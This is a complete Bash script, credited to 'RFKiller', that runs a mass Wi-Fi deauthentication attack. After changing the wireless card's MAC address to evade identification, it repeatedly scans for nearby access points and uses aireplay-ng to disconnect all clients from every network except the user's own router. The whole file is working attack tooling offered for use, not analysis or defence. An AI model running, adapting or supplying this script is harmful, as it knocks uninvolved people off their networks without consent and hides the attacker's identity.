#!/bin/bash
# Mass-Deauth Script by RFKiller <http://rfkiller.they.org>
# Send all emails to <grant.c.stone@gmail.com>
# Copyright (c) GPLv3 - 2013 RFKiller
# Please see the LICENSE file that came with this script

if [[ $EUID -ne 0 ]]; then
	echo -e "\033[31m\n    [!] This script MUST be run as root. Aborting... [!]\033[0m\n" 1>&2
	sleep 1; exit 1
fi

for i in airmon-ng aireplay-ng iw ip iwlist macchanger; do
	command -v $i > /dev/null 2>&1 || {
		echo -e >&2 "\033[31m\n    [!] This script requires $i to be installed. Aborting... [!]\033[0m\n"
		sleep 1; exit 1
	}
done

function usage() {
	cat << EOF

    Usage: $0 [OPTIONS] [ARGUMENTS]

    OPTIONS:
	-d	number of deauth packets to send per AP
	-h	show this help screen
	-i	wireless interface to use during attack
	-m	MAC of your AP (so we don't attack it)
	-w	wait time (in seconds) between attacks

    Example: $0 -d 10 -w 30 -m 11:22:33:44:55:66 -i wlan0

EOF
}
function rmlogs() {
	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
	if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
}
function cleanup() {
	echo -e "\n\n\033[31m[!] Killing aireplay-ng and $MIFACE...\033[0m"
	killall -9 aireplay-ng &> /dev/null
	airmon-ng stop $MIFACE &> /dev/null
	echo -e "\033[31m[!] Removing logs and scan data...\033[0m\n"
	sleep 1; rmlogs
	exit 0
}

flags=':d:hi:m:w:'
while getopts $flags option; do
	case $option in
		d) DEAUTHS=$OPTARG;;
		h) usage; exit;;
		i) WIFACE=$OPTARG;;
		m) ourAPmac=$OPTARG;;
		w) waitTime=$OPTARG;;
		\?) echo "Unknown option: -$OPTARG" >&2; exit 1;;
		:) echo "Missing argument for option: -$OPTARG" >&2; exit 1;;
		*) echo "Unimplemented option: -$OPTARG" >&2; exit 1;;
	esac
done
shift $(($OPTIND - 1))

version="0.2"
atk="0"
MIFACE="mon0"
ask_to_install="1" # Change to 0 or comment out this line to skip asking for installation
suggestedAPmac=`arp -a | grep -E -o '[[:xdigit:]]{2}(:[[:xdigit:]]{2}){5}'`

clear

if [[ ! -e '/usr/bin/mass-deauth' && $ask_to_install = '1' ]];then
	echo -e "\033[31m[!] Script is not installed. Do you want to install it? (y/n)\033[0m"
	read install
	if [[ $install = Y || $install = y ]] ; then
		cp $0 /usr/bin/mass-deauth
		chmod +x /usr/bin/mass-deauth
		rm -rf ../mass-deauth
		echo -e "\n\033[33m[!] Script should now be installed. Launching it now!\n"
		sleep 3
		mass-deauth
		exit 1
	else
		echo -e "\n\033[31m[!] Ok, not installing then! We will just continue instead.\n"
	fi
fi

echo -e "\033[32m[+]\033[0m Setting up for attack..."

while [[ ! $WIFACE ]]; do
	echo -e "\033[33m[>] Type the wireless interface you'd like to use and hit [ENTER]:\033[0m"
	read -e WIFACE
	sleep 1; echo
done
while [[ ! $DEAUTHS ]]; do
	echo -e "\033[33m[>] How many deauthentication packets would you to send to each router?\n[>] Hit [ENTER] to use the default (10)\033[0m"
	read -e DEAUTHS
	if [[ -z $DEAUTHS ]]; then
		echo -e "\033[33m[!]Sending 10 deauthentication packets per round of attacks\033[0m"
		DEAUTHS=10
	fi
	sleep 1; echo
done
while [[ ! $waitTime ]]; do
	echo -e "\033[33m[>] How long would you like to wait (in seconds) between attacks?\n[>] Hit [ENTER] to use the default (60 seconds)\033[0m"
	read -e waitTime
	if [[ -z $waitTime ]]; then
		echo -e "\033[33m[!]Waiting 60 seconds between attacks\033[0m"
		waitTime=60
	fi
	sleep 1; echo
done
while [[ ! $ourAPmac ]]; do
	echo -e "\033[33m[>] Enter the MAC address of your router (so we don't attack it):\n[>] Hit [ENTER] to use the default ($suggestedAPmac)\033[0m"
	read -e ourAPmac
	if [[ -z $ourAPmac ]]; then
		echo -e "\033[33m[!] Using $suggestedAPmac as the MAC address for your router\033[0m"
		ourAPmac=$suggestedAPmac
	fi
	sleep 1; echo
done
export ourAPmac

trap cleanup INT
ip link set $WIFACE up &> /dev/null
rmlogs

while [[ ! $moncheck ]]; do
	ip link set $WIFACE up && airmon-ng start $WIFACE &> /dev/null
	moncheck=`iw dev | awk '$0 ~ /Interface / {print $2}' | grep $MIFACE`
done

echo -e "\033[32m[+]\033[0m Changing wireless card MAC address..."
ip link set $MIFACE down && macchanger -A $MIFACE && ip link set $MIFACE up

scan1="0"

while true; do
	echo -e "\n\033[33m[!] Press [ CTRL+C ]  in this window to kill attack...\033[0m\n"
	rmlogs
	iwlist $WIFACE scan > /tmp/scan.tmp
	awk --posix '$5 ~ /[0-9a-zA-F]{2}:/ && $5 !~ /'$ourAPmac'/ {print $5}' /tmp/scan.tmp > /tmp/APmacs.lst
	cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
	lineNum=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
	echo -e "\033[32m[>]\033[0m Deauthenticating $lineNum APs from scan data..."
	for (( b=1; b<=$lineNum; b++ )); do
			scan1="1"
			curCHAN=`cat /tmp/APchannels.lst | head -n $b`
			curAP=`sed -n -e ''$b'p' '/tmp/APmacs.lst'`
			echo -e "\033[32m[>]\033[0m Deauthenticating all clients on $curAP..."
			aireplay-ng -0 $DEAUTHS -D -a $curAP $MIFACE &> /dev/null &
	done
	atk="1"
	echo -e "\033[32m[>]\033[0m Sleeping for $waitTime seconds...\n" && sleep $waitTime
	for active in `jobs -p`; do
		wait $active
	done
done